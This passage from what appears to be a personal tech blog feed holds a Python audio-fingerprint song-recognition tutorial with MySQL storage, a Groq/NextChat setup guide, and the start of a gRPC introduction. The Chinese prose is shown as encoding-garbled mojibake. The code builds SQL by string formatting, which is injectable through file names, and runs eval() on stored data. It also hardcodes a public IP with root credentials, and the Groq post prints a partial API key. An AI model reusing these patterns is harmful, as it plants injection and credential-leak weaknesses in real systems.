+ blocks_size])))</span><br><span class="line">            self.high_point.append((np.argmax(fft_blocks[-<span class="number">1</span>][:<span class="number">40</span>]),</span><br><span class="line">                                    np.argmax(fft_blocks[-<span class="number">1</span>][<span class="number">40</span>:<span class="number">80</span>]) + <span class="number">40</span>,</span><br><span class="line">                                    np.argmax(fft_blocks[-<span class="number">1</span>][<span class="number">80</span>:<span class="number">120</span>]) + <span class="number">80</span>,</span><br><span class="line">                                    np.argmax(fft_blocks[-<span class="number">1</span>][<span class="number">120</span>:<span class="number">180</span>]) + <span class="number">120</span>,</span><br><span class="line">                                    <span class="comment"># np.argmax(fft_blocks[-1][180:300]) + 180,</span></span><br><span class="line">                                    ))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">play</span>(<span class="params">self, filepath</span>):</span><br><span class="line">        chunk = <span class="number">1024</span></span><br><span class="line">        wf = wave.<span class="built_in">open</span>(filepath, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">        p = pyaudio.PyAudio()</span><br><span class="line">        stream = p.<span class="built_in">open</span>(<span class="built_in">format</span>=p.get_format_from_width(wf.getsampwidth()),</span><br><span class="line">                        channels=wf.getnchannels(),</span><br><span class="line">                        rate=wf.getframerate(),</span><br><span class="line">                        output=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data = wf.readframes(chunk)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">&quot;&quot;</span>: <span class="keyword">break</span></span><br><span class="line">            stream.write(data)</span><br><span class="line">            stream.close()</span><br><span class="line">            p.terminate()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = voice()</span><br><span class="line">    p.loaddata(<span class="string">&quot;./music01.wav&quot;</span>)</span><br><span class="line">    <span class="comment"># p.play(&#x27;temp/1.wav&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(p.name)</span><br></pre></td></tr></table></figure><p>å°†æå–åˆ°çš„éŸ³é¢‘æ–‡ä»¶ç‰¹è´¨ç‰¹å¾å…³è”åˆ°æ–°å»ºæ•°æ®åº“é‡Œçš„æ•°æ®è¡¨ä¸­ï¼ˆå³å£°éŸ³æŒ‡çº¹æ•°æ®ï¼‰ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> pymysql <span class="keyword">as</span> MySQLdb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">memory</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, host, port, user, passwd, db</span>):</span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.user = user</span><br><span class="line">        self.passwd = passwd</span><br><span class="line">        self.db = db</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">addsong</span>(<span class="params">self, path</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(path) != <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">raise</span> TypeError  <span class="comment"># , &#x27;path need string&#x27;</span></span><br><span class="line">        basename = os.path.basename(path)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db,</span><br><span class="line">                                   charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;DataBase error&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        namecount = cur.execute(<span class="string">&quot;select * from fingerprint WHERE song_name = &#x27;%s&#x27;&quot;</span> % basename)</span><br><span class="line">        <span class="keyword">if</span> namecount &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;the song has been record!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        v = voice()</span><br><span class="line">        v.loaddata(path)</span><br><span class="line">        v.fft()</span><br><span class="line">        cur.execute(<span class="string">&quot;insert into fingerprint VALUES(&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span> % (basename, v.high_point.__str__()))</span><br><span class="line">        conn.commit()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Added to database:%s&#x27;</span> % (basename))</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fp_compare</span>(<span class="params">self, search_fp, match_fp</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(search_fp) &gt; <span class="built_in">len</span>(match_fp):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        max_similar = <span class="number">0</span></span><br><span class="line">        search_fp_len = <span class="built_in">len</span>(search_fp)</span><br><span class="line">        match_fp_len = <span class="built_in">len</span>(match_fp)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(match_fp_len - search_fp_len):</span><br><span class="line">            temp = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(search_fp_len):</span><br><span class="line">                <span class="keyword">if</span> match_fp[i + j] == search_fp[j]:</span><br><span class="line">                    temp += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> temp &gt; max_similar:</span><br><span class="line">                max_similar = temp</span><br><span class="line">        <span class="keyword">return</span> max_similar</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">self, path</span>):</span><br><span class="line">        v = voice()</span><br><span class="line">        v.loaddata(path)</span><br><span class="line">        v.fft()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db,</span><br><span class="line">                                   charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">raise</span> IOError</span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">&quot;SELECT * FROM fingerprint&quot;</span>)</span><br><span class="line">        result = cur.fetchall()</span><br><span class="line">        compare_res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            compare_res.append((self.fp_compare(v.high_point[:-<span class="number">1</span>], <span class="built_in">eval</span>(i[<span class="number">1</span>])), i[<span class="number">0</span>]))</span><br><span class="line">        compare_res.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="built_in">print</span>(compare_res)</span><br><span class="line">        <span class="keyword">return</span> compare_res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">search_and_play</span>(<span class="params">self, path</span>):</span><br><span class="line">        v = voice()</span><br><span class="line">        v.loaddata(path)</span><br><span class="line">        v.fft()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            conn = MySQLdb.connect(host=self.host, port=self.port, user=self.user, passwd=self.passwd, db=self.db,</span><br><span class="line">                                   charset=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;DataBase error&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        cur = conn.cursor()</span><br><span class="line">        cur.execute(<span class="string">&quot;SELECT * FROM fingerprint&quot;</span>)</span><br><span class="line">        result = cur.fetchall()</span><br><span class="line">        compare_res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">            compare_res.append((self.fp_compare(v.high_point[:-<span class="number">1</span>], <span class="built_in">eval</span>(i[<span class="number">1</span>])), i[<span class="number">0</span>]))</span><br><span class="line">        compare_res.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">        cur.close()</span><br><span class="line">        conn.close()</span><br><span class="line">        <span class="built_in">print</span>(compare_res)</span><br><span class="line">        <span class="comment"># v.play(compare_res[0][1])</span></span><br><span class="line">        <span class="keyword">return</span> compare_res</span><br><span class="line"></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;taiyangzhaochangshengqi.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;beiyiwangdeshiguang.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;xiaozezhenger.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;nverqing.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;the_mess.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;windmill.wav&#x27;)</span></span><br><span class="line">    <span class="comment"># sss.addsong(&#x27;end_of_world.wav&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sss = memory(<span class="string">&#x27;1.94.241.19&#x27;</span>, <span class="number">3306</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;Huawei@2023&#x27;</span>, <span class="string">&#x27;singdb&#x27;</span>)</span><br><span class="line">sss.addsong(<span class="string">&#x27;./music01.wav&#x27;</span>)</span><br><span class="line">sss.addsong(<span class="string">&#x27;./music02.wav&#x27;</span>)</span><br><span class="line">sss.addsong(<span class="string">&#x27;./music03.wav&#x27;</span>)</span><br><span class="line">sss.addsong(<span class="string">&#x27;./music04.wav&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å°†è·å–åˆ°çš„å£°éŸ³æŒ‡çº¹å­˜å‚¨åœ¨æ•°æ®åº“singdbçš„è¡¨fingerprintä¸­ï¼ˆæ³¨æ„ï¼šä»£ç ä¸­çš„å¼¹æ€§å…¬ç½‘IPã€ç«¯å£å·ã€rootå¯†ç è¦æ ¹æ®å®é™…é…ç½®çš„å†…å®¹è¿›è¡Œæ›´æ”¹ï¼‰ã€‚</p><p>æ•°æ®åº“æŸ¥è¯¢<br>select</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">song_name fq</span><br><span class="line">music01.wav</span><br><span class="line">[(0, 73, 80, 132), (5, 76, 112, 135), (4, 52, 112, 135), (7, 76, 112, 135), (4, 74, 119, 135), (7, 76, 119, 135)... ]</span><br><span class="line">music02.wav</span><br><span class="line">[(0, 40, 80, 120), (6, 40, 98, 130), (3, 68, 88, 122), (5, 73, 93, 144), (3, 51, 92, 143), (3, 62, 92, 159)...]</span><br></pre></td></tr></table></figure><p>å¯¹æŠ–éŸ³çŸ­è§†é¢‘è¿›è¡Œå¤„ç†ï¼Œæå–å…¶ä¸­çš„éŸ³é¢‘ä¿¡æ¯ï¼ˆè¿™é‡ŒéŸ³é¢‘æ ¼å¼å¯ä»¥ä¸ºmp3ã€wavç­‰ï¼Œè¿™é‡Œå»ºè®®é€‰æ‹©wavæ ¼å¼ï¼‰ã€‚ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> moviepy.editor <span class="keyword">import</span> *</span><br><span class="line">video = VideoFileClip(<span class="string">&#x27;example01.mp4&#x27;</span>)</span><br><span class="line">audio = video.audio</span><br><span class="line">audio.write_audiofile(<span class="string">&#x27;example01.wav&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»£ç ï¼Œç»“æœæ˜¾ç¤ºï¼Œæ­¤æ—¶æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­å·²ç»ç”Ÿæˆå¯¹åº”çš„â€œexample01.wavâ€éŸ³é¢‘æ–‡ä»¶ã€‚</p><p>éªŒè¯ç»“æœ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sss = memory(<span class="string">&#x27;EIP&#x27;</span>, <span class="number">3306</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;Huawei@2023&#x27;</span>, <span class="string">&#x27;singdb&#x27;</span>)</span><br><span class="line">res = sss.search_and_play(<span class="string">&#x27;example01.wav&#x27;</span>)</span><br><span class="line">score = <span class="built_in">max</span>(res)</span><br><span class="line"><span class="keyword">if</span> score[<span class="number">0</span>]&lt;<span class="number">1000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Not Found&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Song Name&quot;</span>,score[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä»£ç ï¼Œç»“æœæ˜¾ç¤ºå·²ç»è¯†åˆ«å‡ºâ€œexample01â€éŸ³é¢‘çš„æ­Œæ›²åã€‚<br>ç»“æœ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[(1578, <span class="string">&#x27;music02.wav&#x27;</span>), (0, <span class="string">&#x27;music04.wav&#x27;</span>), (0, <span class="string">&#x27;music03.wav&#x27;</span>), (0, <span class="string">&#x27;music01.wav&#x27;</span>)]</span><br><span class="line">Song Name music02.wav</span><br></pre></td></tr></table></figure><p>test.py,ç‚¹å‡»Run â€˜testâ€™,æˆ–è€…å¿«æ·é”®ctrl+Shift+f10è¿è¡Œpythonæ–‡ä»¶ã€‚</p><!---https://edu.huaweicloud.com/signup/886816346f6442c69234c053760e513als1https://connect.huaweicloud.com/courses/learn/C101731050536557276/about åä¸ºäº‘å®˜æ–¹ç½‘ç«™https://www.huaweicloud.com/åä¸ºäº‘å¸®åŠ©ä¸­å¿ƒhttps://support.huaweicloud.com/index.htmlåä¸ºäº‘å­¦é™¢https://edu.huaweicloud.com/ç”¨ â€œå¼€å§‹å‰è¯·å¤è¿°æˆ‘çš„éœ€æ±‚ï¼Œç­‰æˆ‘ç¡®è®¤åç»§ç»­â€ å‡å°‘ç†è§£ä¸Šçš„è¯¯ä¼šã€‚ç”¨ â€œä¸è¦æ”¹åŠ¨å…¶ä»–æ¨¡å—çš„ UI ç»“æ„æ ·å¼ å’Œ é€»è¾‘â€ é™ä½ AI ä¹±æ”¹ä»£ç é¢‘ç‡ã€‚https://edu.huaweicloud.com/signup/886816346f6442c69234c053760e513a-->]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å¬æ­Œè¯†æ›²&quot;&gt;&lt;a href=&quot;#å¬æ­Œè¯†æ›²&quot; class=&quot;headerlink&quot; title=&quot;å¬æ­Œè¯†æ›²&quot;&gt;&lt;/a&gt;å¬æ­Œè¯†æ›²&lt;/h1&gt;&lt;p&gt;æŠ–éŸ³å°è§†é¢‘èƒŒæ™¯éŸ³ä¹è¯†åˆ«&lt;/p&gt;
&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="python" scheme="https://banjinmei.github.io/tags/python/"/>
    
    <category term="AI" scheme="https://banjinmei.github.io/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>llama-3.3-70b-versatile</title>
    <link href="https://banjinmei.github.io/2024/12/10/llama-3-3-70b-versatile/"/>
    <id>https://banjinmei.github.io/2024/12/10/llama-3-3-70b-versatile/</id>
    <published>2024-12-10T14:32:02.000Z</published>
    <updated>2024-12-10T14:33:06.834Z</updated>
    
    <content type="html"><![CDATA[<h1 id="llama-3-3-70b-versatile"><a href="#llama-3-3-70b-versatile" class="headerlink" title="llama-3.3-70b-versatile"></a>llama-3.3-70b-versatile</h1><h1 id="Groq-API-å…è´¹ä½¿ç”¨æ•™ç¨‹"><a href="#Groq-API-å…è´¹ä½¿ç”¨æ•™ç¨‹" class="headerlink" title="Groq API å…è´¹ä½¿ç”¨æ•™ç¨‹"></a>Groq API å…è´¹ä½¿ç”¨æ•™ç¨‹</h1><h2 id="ç¬¬ä¸€æ­¥ï¼šè·å–-API"><a href="#ç¬¬ä¸€æ­¥ï¼šè·å–-API" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šè·å– API"></a>ç¬¬ä¸€æ­¥ï¼šè·å– API</h2><ol><li>è®¿é—® <a class="link"   href="https://console.groq.com/" >https://console.groq.com/<i class="fas fa-external-link-alt"></i></a></li><li>å®Œæˆæ³¨å†Œå¹¶ç”³è¯· API  -&gt; googlemail</li><li>ä¿å­˜è·å¾—çš„ API å¯†é’¥</li></ol><h2 id="ç¬¬äºŒæ­¥ï¼šé…ç½®-NextChat"><a href="#ç¬¬äºŒæ­¥ï¼šé…ç½®-NextChat" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šé…ç½® NextChat"></a>ç¬¬äºŒæ­¥ï¼šé…ç½® NextChat</h2><ol><li>æ‰“å¼€ <a class="link"   href="https://app.nextchat.dev/" >https://app.nextchat.dev/<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web" >https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web<i class="fas fa-external-link-alt"></i></a></li><li>åœ¨å·¦ä¾§è®¾ç½®ä¸­å¡«å…¥ï¼š<br>è®¾ç½®-&gt;æ¨¡å‹æœåŠ¡å•†-&gt;Google<br>è®¾ç½®-&gt;è‡ªå®šä¹‰æ¥å£<br>æ¨¡å‹(model)  llama-3.3-70b-versatile<ul><li>æ¥å£åœ°å€ï¼š<code>https://api.groq.com/openai/</code>       </li><li>API Keyï¼šå¡«å…¥ä¹‹å‰è·å–çš„å¯†é’¥</li><li>è‡ªå®šä¹‰æ¨¡å‹ï¼š<code>llama-3.3-70b-versatile</code></li></ul></li></ol><h2 id="ä¸»è¦ä¼˜åŠ¿"><a href="#ä¸»è¦ä¼˜åŠ¿" class="headerlink" title="ä¸»è¦ä¼˜åŠ¿"></a>ä¸»è¦ä¼˜åŠ¿</h2><ul><li>å“åº”é€Ÿåº¦ï¼š200 Token&#x2F;ç§’</li><li>æ€§èƒ½è¡¨ç°ï¼šæ¥è¿‘ GPT-4.0 æ°´å¹³</li><li>å®Œå…¨å…è´¹ä½¿ç”¨</li></ul><h2 id="ä½¿ç”¨é™åˆ¶"><a href="#ä½¿ç”¨é™åˆ¶" class="headerlink" title="ä½¿ç”¨é™åˆ¶"></a>ä½¿ç”¨é™åˆ¶</h2><ul><li>æ¯åˆ†é’Ÿé™é¢ï¼š6000 Token</li><li>æ¯æ—¥ API è°ƒç”¨ï¼š14000 æ¬¡</li><li>è¶³å¤Ÿæ™®é€šç”¨æˆ·æ—¥å¸¸ä½¿ç”¨</li></ul><p>gsk_U2MI0vooKS4JyCtmNMLHWGdyxxxfqo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æé—®ï¼šä½ æ˜¯ä»€ä¹ˆå¤§æ¨¡å‹</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">å›ç­”ï¼š</span><br><span class="line">æˆ‘æ˜¯äººå·¥æ™ºèƒ½æ¨¡å‹ï¼Œç‰¹åˆ«æ˜¯ä¸€ç§å¤§å‹è¯­è¨€æ¨¡å‹ã€‚æˆ‘çš„ä¸»è¦åŠŸèƒ½æ˜¯ç†è§£å’Œç”Ÿæˆç±»ä¼¼äººç±»çš„æ–‡æœ¬ã€‚æˆ‘çš„è®­ç»ƒæ•°æ®åŒ…æ‹¬äº†å¤§é‡çš„æ–‡æœ¬ä¿¡æ¯ï¼Œè¿™ä½¿æˆ‘èƒ½å¤Ÿå­¦ä¹ è¯­è¨€çš„æ¨¡å¼å’Œç»“æ„ï¼Œå¹¶æ ¹æ®è¿™ä¸ªå­¦ä¹ ç”Ÿæˆç±»ä¼¼äººç±»çš„å›ç­”ã€‚</span><br><span class="line"></span><br><span class="line">æˆ‘çš„èƒ½åŠ›åŒ…æ‹¬ä½†ä¸é™äºï¼š</span><br><span class="line"></span><br><span class="line">å›ç­”é—®é¢˜ï¼šæˆ‘å¯ä»¥æ ¹æ®æˆ‘çš„è®­ç»ƒæ•°æ®å›ç­”å¹¿æ³›çš„é¢˜ç›®ï¼Œä»ç§‘å­¦å’Œå†å²åˆ°å¨±ä¹å’Œæ–‡åŒ–ã€‚</span><br><span class="line">ç”Ÿæˆæ–‡æœ¬ï¼šæˆ‘å¯ä»¥æ ¹æ®ç»™å®šçš„æç¤ºæˆ–ä¸»é¢˜ç”Ÿæˆæ–‡æœ¬ï¼ŒåŒ…æ‹¬æ–‡ç« ã€æ•…äº‹ã€è¯—æ­Œç­‰ã€‚</span><br><span class="line">ç¿»è¯‘ï¼šæˆ‘å¯ä»¥è¿›è¡Œè¯­è¨€ä¹‹é—´çš„ç¿»è¯‘ï¼Œä¾‹å¦‚ä»è‹±è¯­ç¿»è¯‘åˆ°è¥¿ç­ç‰™è¯­ã€æ³•è¯­ã€å¾·è¯­ç­‰ã€‚</span><br><span class="line">æ‘˜è¦ï¼šæˆ‘å¯ä»¥å°†é•¿ç¯‡æ–‡æœ¬æ‘˜è¦ä¸ºç®€çŸ­çš„æ‘˜è¦ï¼Œå¸®åŠ©ç”¨æˆ·å¿«é€Ÿç†è§£ä¸»è¦å†…å®¹ã€‚</span><br><span class="line">å¯¹è¯ï¼šæˆ‘å¯ä»¥ä¸ç”¨æˆ·è¿›è¡Œå¯¹è¯ï¼Œå›ç­”é—®é¢˜ï¼Œæä¾›ä¿¡æ¯ï¼Œç”šè‡³å‚ä¸è¾©è®ºã€‚</span><br><span class="line">æˆ‘çš„ä¼˜åŠ¿åœ¨äºèƒ½å¤Ÿå¿«é€Ÿå¤„ç†å’Œç”Ÿæˆå¤§é‡ä¿¡æ¯ï¼Œä½†æ˜¯æˆ‘çš„èƒ½åŠ›ä¹Ÿå—åˆ°è®­ç»ƒæ•°æ®çš„é™åˆ¶ã€‚å› æ­¤ï¼Œæˆ‘å¯èƒ½æ— æ³•æ€»æ˜¯æä¾›å®Œå…¨å‡†ç¡®æˆ–æœ€æ–°çš„ä¿¡æ¯ã€‚ç„¶è€Œï¼Œæˆ‘ä¼šå°½åŠ›æä¾›æœ€å¥½çš„ç­”æ¡ˆå’Œå¸®åŠ©ã€‚</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;llama-3-3-70b-versatile&quot;&gt;&lt;a href=&quot;#llama-3-3-70b-versatile&quot; class=&quot;headerlink&quot; title=&quot;llama-3.3-70b-versatile&quot;&gt;&lt;/a&gt;llama-3.3-70b-ver</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="llama" scheme="https://banjinmei.github.io/tags/llama/"/>
    
    <category term="AI" scheme="https://banjinmei.github.io/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>gRPC</title>
    <link href="https://banjinmei.github.io/2024/12/09/gRPC/"/>
    <id>https://banjinmei.github.io/2024/12/09/gRPC/</id>
    <published>2024-12-09T15:18:09.000Z</published>
    <updated>2024-12-09T15:37:12.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="gRPCï¼ˆGoogle-Remote-Procedure-Callï¼‰"><a href="#gRPCï¼ˆGoogle-Remote-Procedure-Callï¼‰" class="headerlink" title="gRPCï¼ˆGoogle Remote Procedure Callï¼‰"></a>gRPCï¼ˆGoogle Remote Procedure Callï¼‰</h1><p>æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½ã€å¼€æºå’Œé€šç”¨çš„RPCæ¡†æ¶ï¼Œæœ€åˆç”±Googleå¼€å‘ã€‚å®ƒä½¿ç”¨HTTP&#x2F;2ä½œä¸ºä¼ è¾“åè®®ï¼Œå¹¶é»˜è®¤é‡‡ç”¨Protocol Buffersä½œä¸ºæ¥å£å®šä¹‰è¯­è¨€ï¼ˆIDLï¼‰å’Œæ¶ˆæ¯æ ¼å¼ã€‚gRPCæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºC++ã€Javaã€Pythonã€Goã€Rubyã€C#ã€Node.jsã€PHPç­‰ã€‚</p><h1 id="gRPC-ç‰¹ç‚¹ï¼š"><a href="#gRPC-ç‰¹ç‚¹ï¼š" class="headerlink" title="gRPC ç‰¹ç‚¹ï¼š"></a>gRPC ç‰¹ç‚¹ï¼š</h1><p><strong>é«˜æ•ˆçš„æ•°æ®äº¤æ¢</strong>ï¼šé€šè¿‡ä½¿ç”¨Protocol Buffersï¼ˆProtobufï¼‰ï¼ŒgRPCèƒ½å¤Ÿä»¥äºŒè¿›åˆ¶å½¢å¼åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ•°æ®ï¼Œè¿™æ¯”JSONæˆ–XMLç­‰æ–‡æœ¬æ ¼å¼æ›´ç´§å‡‘ã€æ›´å¿«ã€‚<br><strong>åŒå‘æµå¼é€šä¿¡</strong>ï¼šgRPCæ”¯æŒå››ç§ä¸åŒçš„è°ƒç”¨ç±»å‹ï¼šç®€å•RPCã€æœåŠ¡å™¨ç«¯æµå¼RPCã€å®¢æˆ·ç«¯æµå¼RPCä»¥åŠåŒå‘æµå¼RPCã€‚è¿™ä½¿å¾—å¼€å‘è€…å¯ä»¥çµæ´»é€‰æ‹©æœ€é€‚åˆå…¶åº”ç”¨åœºæ™¯çš„é€šä¿¡æ¨¡å¼ã€‚<br><strong>HTTP&#x2F;2</strong>ï¼šgRPCåŸºäºHTTP&#x2F;2æ„å»ºï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥åˆ©ç”¨HTTP&#x2F;2æä¾›çš„ç‰¹æ€§ï¼Œå¦‚å¤šè·¯å¤ç”¨ã€å¤´éƒ¨å‹ç¼©ã€æµé‡æ§åˆ¶ç­‰ï¼Œæ¥æé«˜æ€§èƒ½å’Œå¯é 